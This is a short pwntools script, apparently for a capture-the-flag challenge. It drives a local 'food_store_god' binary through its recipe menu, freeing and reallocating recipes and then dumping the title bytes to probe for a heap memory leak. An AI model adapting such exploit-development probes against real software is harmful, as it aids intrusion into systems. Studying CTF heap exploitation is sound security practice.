import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env={'LD_LIBRARY_PATH':DIR})
def ru(x,**k): return p.recvuntil(x,**k)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
ru(b'Your name: '); sl(b'AAAA')
def add(title, ing=b'0'):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1')
    ru(b'Magic : '); m=p.recvline().strip()
    ru(b'Title :'); sl(title)
    ru(b'Choose ingredient :'); sl(ing)
    ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'2')
    ru(b'Your choice: '); sl(b'4'); return m
def make(nm):
    ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'3')
    ru(b'Ingredient :'); sl(nm); ru(b'Your choice: '); sl(b'4')
def remove(title):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2')
    ru(b'Title :'); sl(title); ru(b'Your choice: '); sl(b'4')
add(b'RRRRRRRR'); make(b'bar1'); add(b'FFFFFFFF'); make(b'bar2')
remove(b'RRRRRRRR'); remove(b'FFFFFFFF'); add(b'NEWRECIPE')
# show
ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'3')
import time; time.sleep(0.4)
data=p.recvrepeat(1.0)
print("ALIVE" , p.poll() is None)
print(repr(data[:800]))
# extract Title lines
import re
for m in re.finditer(rb'Title : ([^\n]*)', data):
    t=m.group(1)
    print("TITLE", len(t), t, t.hex())
p.close()
